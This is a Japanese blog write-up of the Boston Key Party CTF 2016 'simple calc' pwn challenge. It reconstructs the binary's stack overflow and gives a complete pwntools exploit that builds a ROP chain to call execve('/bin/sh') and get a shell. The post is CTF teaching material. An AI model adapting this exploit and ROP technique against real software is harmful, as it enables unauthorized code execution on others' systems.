---
layout: post
alias: "/blog/2017/03/07/boston-key-party-2016-simple-calc/"
date: "2017-03-07T15:50:34+09:00"
tags: [ "ctf", "writeup", "pwn", "boston-key-party-ctf", "rop" ]
"target_url": [ "https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/simple-calc-5" ]
---

# Boston Key Party CTF 2016: simple calc

tsunさんとSECCON翌日のpwn会で解いた。ふたりでやって$2$時間かかった。ROPで面倒な方法をしてたらtsunさんに先をshellを取られたりもした。

## solution

計算をしてくれる。
入力値が小さいと`Do you really need help calculating such small numbers?` `Shame on you... Bye`と煽られたりする。

`malloc`/`free`の都合からかstatically linked。

```
$ file simple-calc
simple-calc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped

$ ./simple-calc

	|#------------------------------------#|
	|         Something Calculator         |
	|#------------------------------------#|

Expected number of calculations: 100
Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 3
Integer x: 42
Integer y: 108
Result for x * y is 4536.

Options Menu: 
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 5
zsh: segmentation fault (core dumped)  ./simple-calc
```

revすると以下のようになる。
計算結果がstackに書き込まれるのでropすればよい。
`free`の引数が壊れるが、これは`free(NULL);`になるようにすれば落ちない。

``` c
int add[3];
void adds() {
    input add[0] and add[1]...
    assert (40 <= (unsigned) add[0]);
    assert (40 <= (unsigned) add[1]);
    add[2] = add[0] + add[1];
}
int sub[3];  void subs() { ... }
int mul[3];  void muls() { ... }
int divv[3]; void divs() { ... }
int main(void) {
    print banner...
    input expected number of calculations...
    assert (4 <= n && n <= 255);
    int *buf = malloc(n * sizeof(int));
    for (int i = 0; i < n; ++ i) {
        print menu...
        input choice...
        if (choice == 1) {
            adds();
            buf[i] = add[2];
        } else if (choice == 2) {
            subs...
        } else if (choice == 3) {
            muls...
        } else if (choice == 4) {
            divs...
        } else if (choice == 5) {
            memcpy(stack, buf, n * sizeof(int));
            break;
        } else {
            ...
        }
    }
    free(buf);
    return 0;
}
```

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
# parser.add_argument('host', nargs='?', default='localhost')
# parser.add_argument('port', nargs='?', default=8000, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='simple-calc')
args = parser.parse_args()
context.log_level = args.log_level
elf = ELF(args.binary)

# p = remote(args.host, args.port)
p = process(args.binary)
p.recvuntil('Expected number of calculations: ')
p.sendline('255')
def calc(op, x, y):
    p.recvuntil('=> ')
    p.sendline(str({ '+': 1, '-': 2, '*': 3, '/': 4 }[op]))
    p.recvuntil('Integer x: ')
    p.sendline(str(x))
    p.recvuntil('Integer y: ')
    p.sendline(str(y))
def write64(value):
    for z in [ u32(p64(value)[:4]), u32(p64(value)[4:]) ]:
        for x in range(0x100):
            y = (x - z) % 0x100000000
            if x >= 40 and y >= 40:
                calc('-', x, y)
                break
        else:
            assert False

write64(u64('AAAAAAAA'))
write64(u64('AAAAAAAA'))
write64(u64('AAAAAAAA'))
write64(u64('AAAAAAAA'))
write64(u64('AAAAAAAA'))
write64(u64('AAAAAAAA'))
write64(0) # free
write64(u64('AAAAAAAA'))
write64(1) # rbp

# write /bin/sh
write64(0x401b73) # pop rdi ; ret
write64(0x006c2000 - 8)
write64(0x44db34) # pop rax ; ret
write64(u64('/bin/sh\0'))
write64(0x40dc26) # mov qword ptr [rdi + 8], rax ; ret

# sys_execve
write64(0x401b73) # pop rdi ; ret
write64(0x006c2000)
write64(0x401c87) # pop rsi ; ret
write64(0)
write64(0x437a85) # pop rdx ; ret
write64(0)
write64(0x44db34) # pop rax ; ret
write64(59) # sys_execve
write64(0x4648e5) # syscall

p.recvuntil('=> ')
p.sendline('5')
time.sleep(1)
p.sendline('id')
p.interactive()
```
